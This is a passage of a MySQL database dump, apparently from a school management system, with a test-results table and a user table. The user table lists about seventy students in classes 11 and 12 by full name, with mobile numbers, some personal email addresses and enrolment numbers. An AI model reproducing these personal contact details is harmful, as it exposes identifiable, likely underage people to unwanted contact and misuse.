INSERT INTO `test` (`t_id`, `t_name`, `t_fmarks`, `t_batch`, `t_sub`, `t_class`, `t_date`) VALUES
(1, 'chem ', 120, '0', '8', 12, '2018-06-23'),
(2, 'fdsg', 0, '0', '8', 8, '0000-00-00');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
CREATE TABLE IF NOT EXISTS `user` (
  `u_id` int(11) NOT NULL AUTO_INCREMENT,
  `u_name` varchar(200) NOT NULL,
  `u_lname` varchar(200) NOT NULL,
  `u_card` varchar(200) NOT NULL,
  `u_mail` varchar(250) NOT NULL,
  `u_contact` bigint(20) NOT NULL,
  `u_pcontact` bigint(200) NOT NULL,
  `u_add` text NOT NULL,
  `u_visit` timestamp NOT NULL,
  `u_visitno` int(11) NOT NULL,
  `u_pass` varchar(200) NOT NULL,
  `u_class` int(11) NOT NULL,
  `u_batch` text NOT NULL,
  `u_status` int(11) NOT NULL,
  PRIMARY KEY (`u_id`),
  UNIQUE KEY `u_card` (`u_card`)
) ENGINE=MyISAM AUTO_INCREMENT=77 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`u_id`, `u_name`, `u_lname`, `u_card`, `u_mail`, `u_contact`, `u_pcontact`, `u_add`, `u_visit`, `u_visitno`, `u_pass`, `u_class`, `u_batch`, `u_status`) VALUES
(5, '', '', '12233', '', 0, 8979997072, '', '2018-06-19 18:30:00', 0, '', 8, '0', 1),
(6, 'amit anand', '', '8161949574', '', 8979997072, 8979997072, '', '2018-06-18 18:30:00', 0, '', 8, '', 1),
(7, 'SNEHA ', '', '1218001', '', 7870718992, 7870718992, '', '2018-06-19 18:30:00', 0, '', 12, '', 1),
(8, 'MANISHA ', '', '1218002', '', 9771447584, 9771447584, '', '2018-06-12 18:30:00', 0, '', 12, '', 1),
(9, 'SONALI ', '', '1218003', '', 7903529232, 7903529232, '', '2018-06-18 18:30:00', 0, '', 12, '', 1),
(10, 'ANJALI BHARTI', '', '1218004', 'babyanjali012@gmail.com', 7488775815, 7488775815, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(11, 'ANSHU KUMARI', '', '1218005', 'smileanshu5s@gmail.com', 9934749003, 9934749003, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(12, 'KANAK LATA ', '', '1218006', 'kanaklata8809@gmail.com', 8809850157, 8809850157, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(13, 'ADYA STUDI', '', '1218007', '', 9934223242, 9934223242, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(14, 'SAKSHI GUPTA', '', '1218008', '', 7319961947, 7319961947, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(15, 'KUSHAL SUMAN', '', '1218009', 'kushalsuman123@gmail.com', 9122767601, 9122767601, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(16, 'PRAKHAR PRAKASH', '', '1218010', 'prakharprakash894@gmail.com', 8434609004, 8434609004, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(17, 'VIKAS TUDU', '', '1218011', 'vikastudu1@gmail.com', 8210355550, 8210355550, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(18, 'SOURAV SENROY', '', '1218012', 'souravsenroy17@gmail.com', 8789105437, 8789105437, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(19, 'SAMARTH RAJ ', '', '1218013', 'samarthraj081201@gmail.com', 7782963676, 7782963676, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(20, 'AKASH UMANG', '', '1218014', 'akashumang5555@gmail.com', 9708989746, 9708989746, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(21, 'KUNDAN KUMAR', '', '1218015', 'niketraj00035k@gmail.com', 7870487171, 7870487171, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(22, 'SAMIR MANDAL', '', '1218016', 'samirjmp25@gmail.com', 8340453223, 8340453223, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(23, 'NIKHIL KUMAR SINGH', '', '1218017', 'n12nikhilkumar@gmail.com', 7739168024, 7739168024, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(24, 'PRINCE KUMAR', '', '1218018', 'princekumar6200327239@gmail.com', 6200327239, 6200327239, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(25, 'DEEPAM KUAMR', '', '1218019', 'deepamkumar17@gmail.com', 8210632077, 8210632077, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(26, 'ANKESH KUMAR', '', '1218020', 'ankesh751@gmail.com', 9006069120, 9006069120, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(27, 'PRIYANSH KUAMR', '', '1218021', 'pk717@gmail.com', 7463042268, 7463042268, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(28, 'ABHIJEET KUMAR', '', '1218022', '', 8864085539, 8864085539, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(29, 'SHIVAM SNEHI', '', '1218023', 'shivamstark129@gmail.com', 9113709513, 9113709513, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(30, 'HARSH KUMAR', '', '1218024', '', 9470817772, 9470817772, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(31, 'ABHISHEK KUMAR', '', '1218025', '', 7643088805, 7643088805, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(32, 'NIRANJAN KUMAR', '', '1218026', '', 8541968168, 8541968168, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(33, 'ANKIT KUAMR', '', '1218027', '', 9801448813, 9801448813, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(34, 'RAVI KUMAR', '', '1218028', 'mahimitthu05111@gmail.com', 9931169591, 9931169591, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(35, 'ANURAG KUAMR ', '', '1218029', 'anurag2209s@gmail.com', 9123267592, 9123267592, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(36, 'TEJESHWA ANAND', '', '1218030', 'tejeshwanov25@gmail.com', 8651669398, 8651669398, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(37, 'RAHUL KUMAR RANJAN', '', '1218031', 'kjrahul21@gmail.com', 7759952394, 7759952394, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(38, 'VAISHNAVI ', '', '1218032', '', 7301711304, 7301711304, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(39, 'PRIYANKA SINHA', '', '1218033', '', 6200588960, 6200588960, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(40, 'RAJNANDANI  KUMARI', '', '1218034', '', 9304189490, 9304189490, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(41, 'SHREYA ', '', '1218035', '', 6280130097, 6280130097, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(42, 'VIJAY SHANKAR KUMAR', '', '1218036', '', 7654394063, 7654394063, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(43, 'AASHISH KUMAR', '', '1218037', '', 7050454170, 7050454170, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(44, 'ANIKET RAJ', '', '1218038', '', 9097980208, 9097980208, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(45, 'GOURAV GULZAR', '', '1218039', '', 8434946775, 8434946775, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(46, 'PRABHASH KUMAR', '', '1218040', '', 9113378964, 9113378964, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(47, 'ADITYA KUMAR', '', '1218041', '', 7361863599, 7361863599, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(48, 'OM KUMAR', '', '1218042', '', 7564845488, 7564845488, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(49, 'PRATHAM PANKAJ ', '', '1218043', '', 9065284899, 9065284899, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(50, 'RISHAV KUMAR', '', '1218044', '', 9801700712, 9801700712, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(51, 'NISHANT KUMAR', '', '1218045', '', 9006162893, 9006162893, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(52, 'PRASHANT KUMAR', '', '1218046', '', 8207598138, 8207598138, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(53, 'AMIT CHOURASIA', '', '1218047', '', 8789991320, 8789991320, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(54, 'RAKESH KUMAR', '', '1218048', '', 7808980436, 7808980436, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(55, 'ANAND KUMAR', '', '1218049', '', 8083429216, 8083429216, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(56, 'ASHOK KUMAR', '', '1218050', '', 7479454834, 7479454834, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(57, 'KUNDAN KUMAR', '', '1218051', '', 8709695676, 8709695676, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(58, 'SUMIT KUMAR', '', '1218052', '', 8540908061, 8540908061, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(59, 'MOHIT KUMAR', '', '1218053', '', 9123226265, 9123226265, '', '0000-00-00 00:00:00', 0, '', 12, '', 1),
(60, '', '', '1118001', '', 9801569617, 9801569617, '', '0000-00-00 00:00:00', 0, '', 11, '0', 1),
(61, 'ANJALI KUMARI', '', '1118002', '', 8809133010, 8809133010, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(62, 'ANITA KUMARI', '', '1118003', '', 9801180776, 9801180776, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(63, 'TULIKA ', '', '1118004', '', 8873287899, 8873287899, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(64, 'AKANKSHA KIRAN', '', '1118005', '', 9507032884, 9507032884, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(65, 'ANUPAMA ', '', '1118006', '', 8709978331, 8709978331, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(66, 'RAHUL KUMAR', '', '1118007', '', 8406826822, 8406826822, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(67, 'BHUPENDRA KUMAR', '', '1118008', '', 9534782366, 9534782366, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(68, 'AKASH RANJAN', '', '1118009', '', 6202940672, 6202940672, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(69, 'PRIYANSHU DEEP', '', '1118010', '', 8789037305, 8789037305, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(70, 'ANIKET KUMAR TUDU', '', '1118011', '', 7634924942, 7634924942, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(71, 'ABHILASH KUMAR RANJAN', '', '1118012', '', 8651632266, 8651632266, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(72, 'ADITYA AKASH ', '', '1118013', '', 8709571584, 8709571584, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(73, 'KISHAN KUMAR', '', '1118014', '', 9234916015, 9234916015, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(74, 'PRAVEEN TIWARY', '', '1118015', '', 7765937831, 7765937831, '', '0000-00-00 00:00:00', 0, '', 11, '', 1),
(75, 'SHEETAL KUMARI', '', '1218054', '', 7488404007, 7488404007, '', '0000-00-00 00:00:00', 0, '', 12, '', 1);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
